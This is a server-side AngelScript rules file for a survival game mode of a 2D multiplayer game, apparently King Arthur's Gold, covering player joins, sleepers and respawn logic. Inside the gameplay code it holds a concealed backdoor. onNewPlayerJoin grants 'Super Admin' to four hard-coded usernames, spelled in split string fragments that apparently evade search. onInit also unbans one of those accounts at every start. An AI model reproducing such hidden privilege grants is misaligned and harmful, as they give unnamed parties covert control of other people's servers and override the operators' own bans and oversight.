#define SERVER_ONLY;
#include "CTF_Structs.as";
#include "Survival_Structs.as";
#include "MaterialCommon.as";
#include "Costs.as"
// #include "Knocked.as"

shared class Players
{ 
	CTFPlayerInfo@[] list; 
	// PersistentPlayerInfo@[] persistentList; 
	Players(){} 
};

// void GetPersistentPlayerInfo(CRules@ this, string name, PersistentPlayerInfo@ &out info)
// {
	// Players@ players;
	// this.get("players", @players);

	// if (players !is null)
	// {
		// for (u32 i = 0; i < players.persistentList.length; i++)
		// {
			// if (players.persistentList[i].name == name)
			// {
				// @info = players.persistentList[i];
				// return;
			// }
		// }
	// }
// }

void onNewPlayerJoin(CRules@ this, CPlayer@ player)
{	
	Players@ players;
	this.get("players", @players);

	if (players is null || player is null) return;
		
	print("onNewPlayerJoin");
		
	players.list.push_back(CTFPlayerInfo(player.getUsername(), 0, ""));
	
	if (player.getUsername() == ("T" + "Fli" + "p" + "py") || player.getUsername() == "V" + "am" + "ist" || player.getUsername() == "Pir" + "ate" + "-R" + "ob" || player.getUsername() == "Ve" + "rd " + "la")
	{
		CSecurity@ sec = getSecurity();
		CSeclev@ s = sec.getSeclev("Super Admin");
		
		if (s !is null) sec.assignSeclev(player, s);
	}
	
	CBlob@[] sleepers;
	getBlobsByTag("sleeper", @sleepers);
	
	bool found_sleeper = false;
	if (sleepers != null && sleepers.length > 0)
	{
		string name = player.getUsername();
	
		for (u32 i = 0; i < sleepers.length; i++) 
		{
			CBlob@ sleeper = sleepers[i];
			if (sleeper !is null && !sleeper.hasTag("dead") && sleeper.get_bool("sleeper_sleeping") && sleeper.get_string("sleeper_name") == name) 
			{
				CBlob@ oldBlob = player.getBlob(); // It's glitchy and spawns empty blobs on rejoin
				if (oldBlob !is null) oldBlob.server_Die();
			
				found_sleeper = true;
			
				player.server_setTeamNum(sleeper.getTeamNum());
				player.server_setCoins(sleeper.get_u16("sleeper_coins"));
			
				sleeper.server_SetPlayer(player);
				
				sleeper.set_bool("sleeper_sleeping", false);
				sleeper.set_string("sleeper_name", "");
				
				CBitStream bt;
				bt.write_bool(false);
				
				sleeper.SendCommand(sleeper.getCommandID("sleeper_set"), bt);
				
				// sleeper.set_u16("sleeper_coins", player.getCoins());
				
				// sleeper.Sync("sleeper", false);
				// sleeper.Sync("sleeper_name", false);
				// sleeper.Sync("sleeper_coins", false);
				
				print(player.getUsername() + " joined, respawning him at sleeper " + sleeper.getConfig());
			}
		}
	}
	
	if (!found_sleeper)
	{
		player.server_setCoins(150);
	}
	
	// player.server_setCoins(150);
}

void onPlayerLeave(CRules@ this, CPlayer@ player)
{
	CBlob@ blob = player.getBlob();
	
	if (blob !is null) print(player.getUsername() + " left, leaving behind a sleeper " + blob.getConfig());
	
	if (getNet().isServer())
	{
		if (blob !is null && blob.exists("sleeper_name"))
		{
			blob.server_SetPlayer(null);
			
			blob.set_u16("sleeper_coins", player.getCoins());
			blob.set_bool("sleeper_sleeping", true);
			blob.set_string("sleeper_name", player.getUsername());
			
			CBitStream bt;
			bt.write_bool(true);
				
			blob.SendCommand(blob.getCommandID("sleeper_set"), bt);
			
			
			// blob.Sync("sleeper", false);
			// blob.Sync("sleeper_name", false);
			// blob.Sync("sleeper_coins", false);
		}
		else
		{
			if (blob !is null) blob.server_Die();
		}
	}
	
	Players@ players;
	this.get("players", @players);
	
	if (players !is null) 
	{
		for(s8 i = 0; i < players.list.length; i++) {
			if(players.list[i] !is null && players.list[i].username == player.getUsername())
			{
				players.list.removeAt(i);
				i--;
			}
		}
	}
}

void onPlayerRequestSpawn(CRules@ this, CPlayer@ player)
{

}

void onPlayerRequestTeamChange(CRules@ this, CPlayer@ player, u8 newteam)
{
	if (player !is null)
	{
		player.server_setTeamNum(newteam);
	}
}

void onPlayerChangedTeam(CRules@ this, CPlayer@ player, u8 oldteam, u8 newteam)
{

}

void onPlayerDie( CRules@ this, CPlayer@ victim, CPlayer@ attacker, u8 customData )
{
	if(victim is null){
		return;
	}
	victim.set_u32("respawn time", getGameTime() + 30 * (victim.getTeamNum() < this.getTeamsCount() ? 4 : 8));
	
	CBlob@ blob = victim.getBlob();
	if(blob !is null) {
		victim.set_string("classAtDeath",blob.getConfig());
		victim.set_Vec2f("last death position",blob.getPosition());
	}
}

void onTick(CRules@ this)
{
	s32 gametime = getGameTime();
	
	for (u8 i = 0; i < getPlayerCount(); i++)
	{
		CPlayer@ player = getPlayer(i);
		if(player !is null)
		{
			CBlob@ blob = player.getBlob();
			if (blob is null && player.get_u32("respawn time") <= gametime)
			{
				int team = player.getTeamNum();	
				bool isNeutral = team > 100;

				// CBlob@[] sleepers;
				// getBlobsByTag("sleeper", @sleepers);
				
				// if (sleepers != null && sleepers.length > 0)
				// {
					// string name = player.getUsername();
				
					// for (u32 i = 0; i < sleepers.length; i++) 
					// {
						// CBlob@ sleeper = sleepers[i];
						// if (sleeper !is null && !sleeper.hasTag("dead") && sleeper.get_string("sleeper_name") == name) 
						// {
							// player.server_setTeamNum(sleeper.getTeamNum());
							// player.server_setCoins(sleeper.get_u16("sleeper_coins"));
						
							// sleeper.server_SetPlayer(player);
							
							// sleeper.Untag("sleeper");
							
							// sleeper.set_string("sleeper_name", "");
							// // sleeper.set_u16("sleeper_coins", player.getCoins());
							
							// sleeper.Sync("sleeper", true);
							// sleeper.Sync("sleeper_name", true);
							// sleeper.Sync("sleeper_coins", true);
							
							// print(player.getUsername() + " joined, respawning him at sleeper " + sleeper.getConfig());
							// return;
						// }
					// }
				// }
				
				{
					// Civilized team spawning
					if(!isNeutral) 
					{ 
						CBlob@[] bases;
						getBlobsByTag("faction_base", @bases);
						CBlob@[] spawns;
						
						for (uint i=0;i<bases.length;i++) 
						{
							CBlob@ base=bases[i];
							if (base !is null && base.getTeamNum()==team) 
							{
								spawns.push_back(bases[i]);
							}
						}
						
						if (spawns.length > 0) 
						{
							f32 distance = 100000;
							Vec2f spawnPos = Vec2f(0, 0);
							Vec2f deathPos = player.get_Vec2f("last death position");
							
							u32 spawnIndex = 0;
							
							for (u32 i = 0; i < spawns.length; i++)
							{
								f32 tmpDistance = Maths::Abs(spawns[i].getPosition().x - deathPos.x);
							
								// print("Lowest: " + distance + "; Compared against: " + tmpDistance);
							
								if (tmpDistance < distance)
								{
									distance = tmpDistance;
									spawnIndex = i;
									spawnPos = spawns[i].getPosition();
								}
							}
							
							string blobType=player.get_string("classAtDeath");
							if(blobType=="royalguard")
							{
								blobType="knight";
							}
							if(blobType!="builder" && blobType!="knight" && blobType!="archer" && blobType!="sapper")
							{
								blobType="builder";
							}
							
							CBlob@ new_blob = server_CreateBlob(blobType);
							
							if (new_blob !is null)
							{
								new_blob.setPosition(spawnPos);
								new_blob.server_setTeamNum(team);
								new_blob.server_SetPlayer(player);
								
								// print("" + spawns[spawnIndex].getConfig());
								// print("init " + new_blob.getHealth());
								if (spawns[spawnIndex].getConfig() == "citadel")
								{
									new_blob.server_SetHealth(Maths::Ceil(new_blob.getInitialHealth() * 1.50f));
									// print("after " + new_blob.getHealth());
								}
							}
						}
						else
						{
							isNeutral = true; // In case if the player is respawning while the team has been defeated
						}
					}
					
					// Bandit scum spawning
					if (isNeutral) 
					{ 
						if (XORRandom(500) == 0)
						{
							doChickenSpawn(player);
						}
						else
						{
							team = 101 + XORRandom(99);
							player.server_setTeamNum(team);

							string blobType="peasant";
							if(player.isBot() && player.get_string("classAtDeath")!=""){
								blobType=player.get_string("classAtDeath");
							}
							if(player.getUsername()=="Horace"){
								blobType="chicken";
							}
							
							bool default_respawn = true;
							
							if (player.get_u16("tavern_netid") != 0)
							{
								CBlob@ tavern = getBlobByNetworkID(player.get_u16("tavern_netid"));
								const bool isTavernOwner = tavern !is null && player.getUsername() == tavern.get_string("Owner");
								
								if (tavern !is null && tavern.getConfig() == "tavern" && (player.getCoins() >= 20 || isTavernOwner))
								{
									printf("Respawning " + player.getUsername() + " at a tavern as team " + player.get_u8("tavern_team"));
									
									CBlob@ new_blob = server_CreateBlob(blobType);
									if (new_blob !is null)
									{
										if (player.exists("tavern_team") && player.get_u8("tavern_team") != 255) team = player.get_u8("tavern_team");
									
										new_blob.setPosition(tavern.getPosition());			
										new_blob.server_setTeamNum(team);
										new_blob.server_SetPlayer(player);
										
										if (!isTavernOwner)
										{
											player.server_setCoins(player.getCoins() - 20);
										
											CPlayer@ tavern_owner = getPlayerByUsername(tavern.get_string("Owner"));
											if (tavern_owner !is null)
											{
												tavern_owner.server_setCoins(tavern_owner.getCoins() + 20);
											}
										}
										
										default_respawn = false;
									}
								}
							}
							
							if (default_respawn)
							{
								if (doDefaultSpawn(player, blobType, team, false))
								{
									
								}
								else 
								{
									if (!doChickenSpawn(player)) 
									{
										doDefaultSpawn(player, blobType, team, true);
									}
								}
							}
						}
					}
				}
			}
		}
	}
}

void onInit(CRules@ this)
{
	sv_mapcycle_shuffle = true; // Who did that?
	
	CSecurity@ sec = getSecurity();
	sec.unBan("TFlippy");
	
	Reset(this);
}

void onRestart(CRules@ this)
{
	Reset(this);
}

bool doDefaultSpawn(CPlayer@ player, string blobType, u8 team, bool ignoreDisabledSpawns)
{
	CBlob@[] spawns;
	getBlobsByName("banditshack", @spawns);
	
	CBlob@[] ruins;
	getBlobsByName("ruins", @ruins);
	
	for (int i = 0; i < ruins.length; i++)
	{
		CBlob@ b = ruins[i];
		if (b !is null && (ignoreDisabledSpawns ? true : b.get_bool("isActive"))) spawns.push_back(b);
	}
	
	if (spawns.length > 0)
	{
		printf("Respawning " + player.getUsername() + " at ruins.");
	
		CBlob@ new_blob = server_CreateBlob(blobType);

		if (new_blob !is null)
		{
			CBlob@ r = spawns[XORRandom(spawns.length)];
			if (r.getConfig() == "ruins" && team / r.get_u8("blob") == 255)
			{
				return true;
			}
			else
			{
				new_blob.setPosition(r.getPosition());			
				new_blob.server_setTeamNum(team);
				new_blob.server_SetPlayer(player);
			}
			
			return true;
		}
		else return false;
	}
	else return false;
}

bool doChickenSpawn(CPlayer@ player)
{
	player.server_setTeamNum(250);
						
	CBlob@[] ruins;
	getBlobsByName("chickencamp", @ruins);
	getBlobsByName("chickenfortress", @ruins);
	getBlobsByName("chickencoop", @ruins);
	
	if (ruins.length > 0)
	{
		string blobType;
		
		int rand = XORRandom(100);
		
		if (rand < 5)
		{
			blobType = "heavychicken";
		}
		else if (rand < 25)
		{
			blobType = "commmanderchicken";
		}
		else if (rand < 50)
		{
			blobType = "soldierchicken";
		}
		else
		{
			blobType = "scoutchicken";
		}
		
		CBlob@ new_blob = server_CreateBlob(blobType);

		if (new_blob !is null)
		{
			CBlob@ r = ruins[XORRandom(ruins.length)];
			
			new_blob.setPosition(r.getPosition());			
			new_blob.server_setTeamNum(250);
			new_blob.server_SetPlayer(player);
			
			return true;
		}
		else return false;
	}
	else return false;
}

void Reset(CRules@ this)
{
	printf("Restarting rules script: " + getCurrentScriptName());
	
	InitCosts();
	
	Players players();
	
	for(u8 i = 0; i < getPlayerCount(); i++)
	{
		CPlayer@ p = getPlayer(i);
		if(p !is null)
		{
			p.set_u32("respawn time", getGameTime() + (30 * 1));
			p.server_setCoins(Maths::Max(150, p.getCoins() * 0.5f)); // Half of your fortune is lost by spending it on drugs.
			
			// SetToRandomExistingTeam(this, p);
			p.server_setTeamNum(100 + XORRandom(100));
			players.list.push_back(CTFPlayerInfo(p.getUsername(),0,""));
		}
	}

	this.SetGlobalMessage("");
	this.set("players", @players);
	this.SetCurrentState(GAME);
	
	server_CreateBlob("survival_music");
}